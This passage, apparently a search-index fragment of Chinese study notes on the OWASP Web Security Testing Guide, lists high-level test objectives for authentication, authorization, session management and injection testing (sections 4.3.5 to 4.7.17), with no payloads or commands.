<p>4.3.5\u6d4b\u8bd5\u5f31\u7528\u6237\u540d\u7b56\u7565\u6216\u672a\u5f3a\u5236\u6267\u884c\u7684\u7528\u6237\u540d\u7b56\u7565</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_5","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u4e00\u81f4\u7684\u8d26\u6237\u540d\u79f0\u7ed3\u6784\u662f\u5426\u4f1a\u4f7f\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u53d7\u5230\u8d26\u6237\u679a\u4e3e\u653b\u51fb</li> <li>[ ] \u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u7684\u9519\u8bef\u4fe1\u606f\u662f\u5426\u5141\u8bb8\u8d26\u6237\u679a\u4e3e</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/","title":"4\u3001\u8ba4\u8bc1\u6d4b\u8bd5","text":"<p>4.4.1\u6d4b\u8bd5\u901a\u8fc7\u52a0\u5bc6\u901a\u9053\u4f20\u8f93\u7684\u51ed\u8bc1</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u7f51\u7ad9\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u7528\u4f8b\u662f\u5426\u4f1a\u5bfc\u81f4\u670d\u52a1\u5668\u6216\u5ba2\u6237\u7aef\u5728\u4e0d\u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\u4ea4\u6362\u51ed\u636e</li> </ul> <p>4.4.2\u6d4b\u8bd5\u9ed8\u8ba4\u51ed\u8bc1</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u679a\u4e3e\u9ed8\u8ba4\u51ed\u636e\u7684\u5e94\u7528\u7a0b\u5e8f\u5e76\u9a8c\u8bc1\u5b83\u4eec\u662f\u5426\u5b58\u5728\u3002</li> <li>[ ] \u68c0\u67e5\u548c\u8bc4\u4f30\u65b0\u7684\u7528\u6237\u8d26\u6237\uff0c\u4ee5\u53ca\u5b83\u4eec\u662f\u5426\u4f7f\u7528\u4efb\u4f55\u9ed8\u8ba4\u503c\u6216\u53ef\u8bc6\u522b\u6a21\u5f0f\u521b\u5efa\u7684</li> </ul> <p>4.4.3\u5f31\u9501\u673a\u5236\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u8d26\u6237\u9501\u5b9a\u673a\u5236\u7f13\u89e3\u66b4\u529b\u5bc6\u7801\u731c\u6d4b\u7684\u80fd\u529b</li> <li>[ ] \u8bc4\u4f30\u89e3\u9501\u673a\u5236\u5bf9\u672a\u7ecf\u6388\u6743\u7684\u8d26\u6237\u89e3\u9501\u7684\u62b5\u6297\u529b</li> </ul> <p>4.4.4\u6d4b\u8bd5\u7ed5\u8fc7\u8ba4\u8bc1\u6a21\u5f0f</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u4fdd\u8eab\u4efd\u9a8c\u8bc1\u5e94\u7528\u4e8e\u6240\u6709\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\u7684\u670d\u52a1\u3002</li> </ul> <p>4.4.5\u6d4b\u8bd5\u8bb0\u4f4f\u5bc6\u7801\u6f0f\u6d1e</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_5","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u9a8c\u8bc1\u751f\u6210\u7684\u4f1a\u8bdd\u662f\u5426\u5f97\u5230\u5b89\u5168\u7ba1\u7406\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5c06\u7528\u6237\u7684\u51ed\u636e\u7f6e\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002</li> </ul> <p>4.4.6\u6d4b\u8bd5\u6d4f\u89c8\u5668\u7f13\u5b58\u5f31\u70b9</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_6","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u654f\u611f\u4fe1\u606f</li> <li>[ ] \u68c0\u67e5\u662f\u5426\u53ef\u4ee5\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u8bbf\u95ee</li> </ul> <p>4.4.7\u5f31\u53e3\u4ee4\u7b56\u7565\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_7","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u901a\u8fc7\u8bc4\u4f30\u5bc6\u7801\u7684\u957f\u5ea6\u3001\u590d\u6742\u6027\u3001\u91cd\u7528\u548c\u8001\u5316\u8981\u6c42\uff0c\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u5bf9\u4f7f\u7528\u53ef\u7528\u5bc6\u7801\u5b57\u5178\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u731c\u6d4b\u7684\u62b5\u6297\u529b</li> </ul> <p>4.4.8\u5f31\u5b89\u5168\u95ee\u9898\u7b54\u6848\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_8","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u95ee\u9898\u7684\u590d\u6742\u6027\u548c\u7b80\u5355\u7a0b\u5ea6</li> <li>[ ] \u8bc4\u4f30\u53ef\u80fd\u7684\u7528\u6237\u7b54\u6848\u548c\u5f3a\u529b\u80fd\u529b</li> </ul> <p>4.4.9\u6d4b\u8bd5\u5f31\u5bc6\u7801\u66f4\u6539\u6216\u91cd\u7f6e\u529f\u80fd</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_9","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u5bf9\u7834\u574f\u8d26\u6237\u66f4\u6539\u8fc7\u7a0b\uff08\u5141\u8bb8\u67d0\u4eba\u66f4\u6539\u8d26\u6237\u5bc6\u7801\uff09\u7684\u62b5\u6297\u529b</li> <li>[ ] \u786e\u5b9a\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u5bf9\u731c\u6d4b\u6216\u7ed5\u8fc7\u7684\u62b5\u6297\u529b</li> </ul> <p>4.4.10\u5728\u66ff\u4ee3\u901a\u9053\u4e2d\u6d4b\u8bd5\u8f83\u5f31\u7684\u8ba4\u8bc1</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_10","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u66ff\u4ee3\u8eab\u4efd\u9a8c\u8bc1\u6e20\u9053</li> <li>[ ] \u8bc4\u4f30\u6240\u4f7f\u7528\u7684\u5b89\u5168\u63aa\u65bd\u4ee5\u53ca\u66ff\u4ee3\u6e20\u9053\u4e0a\u662f\u5426\u5b58\u5728\u4efb\u4f55\u65c1\u8def</li> </ul> <p>4.4.11\u6d4b\u8bd5\u591a\u91cd\u8eab\u4efd\u9a8c\u8bc1</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/4%E3%80%81%E8%AE%A4%E8%AF%81%E6%B5%8B%E8%AF%95/#_11","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684 MFA \u7c7b\u578b</li> <li>[ ] \u786e\u5b9a MFA \u5b9e\u65bd\u662f\u5426\u7a33\u5065\u4e14\u5b89\u5168</li> <li>[ ] \u5c1d\u8bd5\u7ed5\u8fc7 MFA</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/","title":"5\u3001\u6388\u6743\u6d4b\u8bd5","text":"<p>4.5.1\u6d4b\u8bd5\u76ee\u5f55\u904d\u5386\u6587\u4ef6\u5305\u542b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u4e0e\u8def\u5f84\u904d\u5386\u76f8\u5173\u7684\u6ce8\u5165\u70b9</li> <li>[ ] \u8bc4\u4f30\u7ed5\u8fc7\u6280\u672f\u5e76\u786e\u5b9a\u8def\u5f84\u904d\u5386\u7684\u8303\u56f4</li> </ul> <p>4.5.2\u7ed5\u8fc7\u6388\u6743\u6a21\u5f0f\u7684\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u6c34\u5e73\u6216\u5782\u76f4\u8bbf\u95ee</li> </ul> <p>4.5.3 \u6743\u9650\u63d0\u5347\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u4e0e\u6743\u9650\u64cd\u7eb5\u76f8\u5173\u7684\u6ce8\u5165\u70b9</li> <li>[ ] \u6a21\u7cca\u6216\u4ee5\u5176\u4ed6\u65b9\u5f0f\u5c1d\u8bd5\u7ed5\u8fc7\u5b89\u5168\u63aa\u65bd</li> </ul> <p>4.5.4\u6d4b\u8bd5\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u6d4b\u8bd5\u53ef\u80fd\u53d1\u751f\u5bf9\u8c61\u5f15\u7528\u7684\u70b9</li> <li>[ ] \u8bc4\u4f30\u8bbf\u95ee\u63a7\u5236\u63aa\u65bd\u4ee5\u53ca\u5b83\u4eec\u662f\u5426\u5bb9\u6613\u53d7\u5230 IDOR \u653b\u51fb</li> </ul> <p>4.5.5\u6d4b\u8bd5 OAuth \u5f31\u70b9</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_5","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a OAuth2 \u5b9e\u73b0\u662f\u5426\u5bb9\u6613\u6536\u5230\u653b\u51fb\u6216\u4f7f\u7528\u5df2\u5f03\u7528\u6216\u81ea\u5b9a\u4e49\u7684\u5b9e\u73b0\u3002</li> </ul> <p>4.5.5.1\u6d4b\u8bd5 OAuth \u6388\u6743\u670d\u52a1\u5668\u5f31\u70b9</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_6","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u6388\u6743\u670d\u52a1\u5668\u4e2d\u7684\u5f31\u70b9</li> </ul> <p>4.5.5.2\u6d4b\u8bd5 OAuth \u5ba2\u6237\u7aef\u5f31\u70b9</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/5%E3%80%81%E6%8E%88%E6%9D%83%E6%B5%8B%E8%AF%95/#_7","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b OAuth \u5ba2\u6237\u7aef\u4e2d\u7684\u5f31\u70b9</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"6\u3001\u4f1a\u8bdd\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.6.1\u4f1a\u8bdd\u7ba1\u7406\u6a21\u5f0f\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u5c3d\u53ef\u80fd\u4e3a\u540c\u4e00\u7528\u6237\u548c\u4e0d\u540c\u7528\u6237\u6536\u96c6\u4f1a\u8bdd\u4ee4\u724c</li> <li>[ ] \u5206\u6790\u5e76\u786e\u4fdd\u5b58\u5728\u8db3\u591f\u7684\u968f\u673a\u6027\u6765\u963b\u6b62\u4f1a\u8bdd\u4f2a\u9020\u653b\u51fb</li> <li>[ ] \u4fee\u6539\u672a\u7b7e\u540d\u4e14\u5305\u542b\u53ef\u64cd\u7eb5\u4fe1\u606f\u7684 cookie</li> </ul> <p>4.6.2\u00a0Cookies \u5c5e\u6027\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u4fdd\u4e3a cookie \u8bbe\u7f6e\u6b63\u786e\u7684\u5b89\u5168\u914d\u7f6e</li> </ul> <p>4.6.3\u4f1a\u8bdd\u56fa\u5b9a\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u5206\u6790\u8ba4\u8bc1\u673a\u5236\u53ca\u5176\u6d41\u7a0b</li> <li>[ ] \u5f3a\u5236 cookie \u5e76\u8bc4\u4f30\u5f71\u54cd</li> </ul> <p>4.6.4\u6d4b\u8bd5\u66b4\u9732\u7684\u4f1a\u8bdd\u53d8\u91cf</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u4fdd\u5b9e\u65bd\u6b63\u786e\u7684\u52a0\u5bc6</li> <li>[ ] \u68c0\u67e5\u7f13\u5b58\u914d\u7f6e</li> <li>[ ] \u8bc4\u4f30\u901a\u9053\u548c\u65b9\u6cd5\u7684\u5b89\u5168\u6027</li> </ul> <p>4.6.5\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_5","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u662f\u5426\u53ef\u4ee5\u4ee3\u8868\u7528\u6237\u53d1\u8d77\u8bf7\u6c42</li> </ul> <p>4.6.6\u6d4b\u8bd5\u6ce8\u9500\u529f\u80fd</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_6","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u6ce8\u9500 UI</li> <li>[ ] \u5206\u6790\u4f1a\u8bdd\u8d85\u65f6\u4ee5\u53ca\u6ce8\u9500\u540e\u4f1a\u8bdd\u662f\u5426\u88ab\u6b63\u786e\u7ec8\u6b62</li> </ul> <p>4.6.7\u6d4b\u8bd5\u4f1a\u8bdd\u8d85\u65f6</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_7","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u9a8c\u8bc1\u662f\u5426\u5b58\u5728\u786c\u4f1a\u8bdd\u8d85\u65f6</li> </ul> <p>4.6.8\u4f1a\u8bdd\u6df7\u6dc6\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_8","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u6240\u6709\u4f1a\u8bdd\u53d8\u91cf</li> <li>[ ] \u6253\u7834\u4f1a\u8bdd\u751f\u6210\u7684\u903b\u8f91\u6d41\u7a0b</li> </ul> <p>4.6.9\u4f1a\u8bdd\u52ab\u6301\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_9","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u6613\u53d7\u653b\u51fb\u7684\u4f1a\u8bdd cookie</li> <li>[ ] \u52ab\u6301\u6613\u53d7\u653b\u51fb\u7684 cookie \u5e76\u8bc4\u4f30\u98ce\u9669\u7ea7\u522b</li> </ul> <p>4.6.10\u6d4b\u8bd5 JSON Web \u4ee4\u724c</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/6%E3%80%81%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_10","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a JWT \u662f\u5426\u66b4\u9732\u654f\u611f\u4fe1\u606f</li> <li>[ ] \u786e\u5b9a JWT \u662f\u5426\u53ef\u4ee5\u88ab\u7be1\u6539\u6216\u4fee\u6539</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/7%E3%80%81%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95/","title":"7\u3001\u8f93\u5165\u9a8c\u8bc1\u6d4b\u8bd5","text":"<p>4.7.1\u53cd\u5c04\u8de8\u7ad9\u811a\u672c\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/7%E3%80%81%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u786e\u5b9a\u54cd\u5e94\u4e2d\u53cd\u6620\u7684\u53d8\u91cf</li> <li>[ ] \u8bc4\u4f30\u5b83\u4eec\u63a5\u53d7\u7684\u8f93\u5165\u4ee5\u53ca\u8fd4\u56de\u65f6\u5e94\u7528\u7684\u7f16\u7801</li> </ul> <p>4.7.2\u6d4b\u8bd5\u5b58\u50a8\u7684\u8de8\u7ad9\u811a\u672c</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/7%E3%80%81%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u53cd\u6620\u5728\u5ba2\u6237\u7aef\u7684\u5b58\u50a8\u8f93\u5165\u3002</li> <li>[ ] \u8bc4\u4f30\u5b83\u4eec\u63a5\u53d7\u7684\u8f93\u5165\u4ee5\u53ca\u8fd4\u56de\u65f6\u5e94\u7528\u7684\u7f16\u7801\uff08\u5982\u679c\u6709\uff09\u3002</li> </ul> <p>4.7.3\u6d4b\u8bd5 HTTP \u52a8\u8bcd\u7be1\u6539</p> <p>Test HTTP Methods</p> <p>4.7.4\u00a0HTTP\u53c2\u6570\u6c61\u67d3\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u786e\u5b9a\u540e\u7aef\u548c\u4f7f\u7528\u7684\u89e3\u6790\u65b9\u6cd5\u3002 \u8bc4\u4f30\u6ce8\u5165\u70b9\u5e76\u5c1d\u8bd5\u4f7f\u7528 HPP \u7ed5\u8fc7\u8f93\u5165\u8fc7\u6ee4\u5668\u3002</p> <p>4.7.5\u00a0SQL \u6ce8\u5165\u6d4b\u8bd5</p> <p>\u8bc6\u522b SQL \u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u6ce8\u5165\u7684\u4e25\u91cd\u7a0b\u5ea6\u4ee5\u53ca\u901a\u8fc7\u6ce8\u5165\u53ef\u4ee5\u5b9e\u73b0\u7684\u8bbf\u95ee\u7ea7\u522b\u3002</p> <ul> <li> <p>4.7.5.1\u00a0Oracle \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.2\u00a0MySQL \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.3\u00a0SQL Server \u6d4b\u8bd5</p> </li> <li> <p>4.7.5.4\u6d4b\u8bd5 PostgreSQL</p> </li> <li> <p>4.7.5.5\u6d4b\u8bd5 MS Access</p> </li> <li> <p>4.7.5.6\u00a0NoSQL\u6ce8\u5165\u6d4b\u8bd5</p> </li> <li> <p>4.7.5.7\u00a0ORM\u6ce8\u5165\u6d4b\u8bd5</p> </li> <li> <p>4.7.5.8\u5ba2\u6237\u7aef\u6d4b\u8bd5</p> </li> </ul> <p>\u4ee5\u4e0b\u6d4b\u8bd5\u573a\u666f\u5c06\u9a8c\u8bc1\u662f\u5426\u8fdb\u884c\u4e86\u6b63\u786e\u7684\u8f93\u5165\u9a8c\u8bc1\u3002\u5982\u679c\u5b9e\u73b0\u5b58\u5728\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8bfb\u53d6\u3001\u4fee\u6539\u6216\u5220\u9664\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\u3002</p> <p>4.7.6\u6d4b\u8bd5 LDAP \u6ce8\u5165</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b LDAP \u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u6ce8\u5c04\u7684\u4e25\u91cd\u7a0b\u5ea6\u3002</p> <p>4.7.7\u00a0XML \u6ce8\u5165\u6d4b\u8bd5 https://tttang.com/archive/1813/#toc_xml</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b XML \u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u53ef\u5b9e\u73b0\u7684\u653b\u51fb\u7c7b\u578b\u53ca\u5176\u4e25\u91cd\u6027\u3002</p> <p>4.7.8\u00a0SSI \u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b SSI \u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u6ce8\u5c04\u7684\u4e25\u91cd\u7a0b\u5ea6\u3002</p> <p>4.7.9\u00a0XPath \u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b XPATH \u6ce8\u5165\u70b9\u3002</p> <p>4.7.10\u00a0IMAP SMTP \u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b IMAP/SMTP \u6ce8\u5165\u70b9\u3002 \u4e86\u89e3\u7cfb\u7edf\u7684\u6570\u636e\u6d41\u7a0b\u548c\u90e8\u7f72\u7ed3\u6784\u3002 \u8bc4\u4f30\u6ce8\u5165\u5f71\u54cd\u3002</p> <p>4.7.11\u4ee3\u7801\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u786e\u5b9a\u53ef\u5c06\u4ee3\u7801\u6ce8\u5165\u5e94\u7528\u7a0b\u5e8f\u7684\u6ce8\u5165\u70b9\u3002 \u8bc4\u4f30\u6ce8\u5c04\u4e25\u91cd\u7a0b\u5ea6\u3002</p> <ul> <li>4.7.11.1\u6587\u4ef6\u5305\u542b\u6d4b\u8bd5</li> </ul> <p>\u8bc6\u522b\u6587\u4ef6\u5305\u542b\u70b9\u3002 \u8bc4\u4f30\u6f0f\u6d1e\u7684\u4e25\u91cd\u6027\u6216\u6f5c\u5728\u5f71\u54cd\u3002</p> <p>4.7.12\u547d\u4ee4\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u8bc6\u522b\u5e76\u8bc4\u4f30\u547d\u4ee4\u6ce8\u5165\u70b9\u3002</p> <p>4.7.13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u8bc4\u4f30\u5c06\u683c\u5f0f\u5b57\u7b26\u4e32\u8f6c\u6362\u8bf4\u660e\u7b26\u6ce8\u5165\u7528\u6237\u63a7\u5236\u7684\u5b57\u6bb5\u662f\u5426\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u4e0d\u826f\u884c\u4e3a\u3002</p> <p>4.7.14\u5b75\u5316\u6f0f\u6d1e\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc6\u522b\u5df2\u5b58\u50a8\u7684\u8fdb\u6837\u5e76\u9700\u8981\u5bf9\u5df2\u5b58\u50a8\u7684\u8fdb\u6837\u6267\u884c\u8c03\u7528\u6b65\u9aa4\u3002 \u4e86\u89e3\u53ec\u56de\u6b65\u9aa4\u662f\u5982\u4f55\u53d1\u751f\u7684\u3002 \u5982\u679c\u53ef\u80fd\u7684\u8bdd\uff0c\u8bbe\u7f6e\u4fa6\u542c\u5668\u6216\u6fc0\u6d3b\u8c03\u7528\u6b65\u9aa4\u3002</p> <p>4.7.15\u00a0HTTP \u62c6\u5206\u8d70\u79c1\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc4\u4f30\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5bb9\u6613\u53d7\u5230\u5206\u88c2\uff0c\u786e\u5b9a\u53ef\u4ee5\u5b9e\u73b0\u54ea\u4e9b\u53ef\u80fd\u7684\u653b\u51fb\u3002 \u8bc4\u4f30\u901a\u4fe1\u94fe\u662f\u5426\u5bb9\u6613\u53d7\u5230\u8d70\u79c1\u7684\u5f71\u54cd\uff0c\u786e\u5b9a\u53ef\u4ee5\u5b9e\u73b0\u54ea\u4e9b\u53ef\u80fd\u7684\u653b\u51fb</p> <p>4.7.16\u6d4b\u8bd5 HTTP \u4f20\u5165\u8bf7\u6c42</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u76d1\u89c6\u5bf9 Web \u670d\u52a1\u5668\u7684\u6240\u6709\u4f20\u5165\u548c\u4f20\u51fa HTTP \u8bf7\u6c42\uff0c\u4ee5\u68c0\u67e5\u4efb\u4f55\u53ef\u7591\u8bf7\u6c42\u3002 \u76d1\u63a7 HTTP \u6d41\u91cf\uff0c\u65e0\u9700\u66f4\u6539\u6700\u7ec8\u7528\u6237\u6d4f\u89c8\u5668\u4ee3\u7406\u6216\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>4.7.17\u4e3b\u673a\u5934\u6ce8\u5165\u6d4b\u8bd5</p> <p>\u6d4b\u8bd5\u76ee\u6807 \u8bc4\u4f30\u5e94\u7528\u7a0b\u5e8f\u4e2d\u662f\u5426\u52a8\u6001\u89e3\u6790\u4e3b\u673a\u6807\u5934\u3002 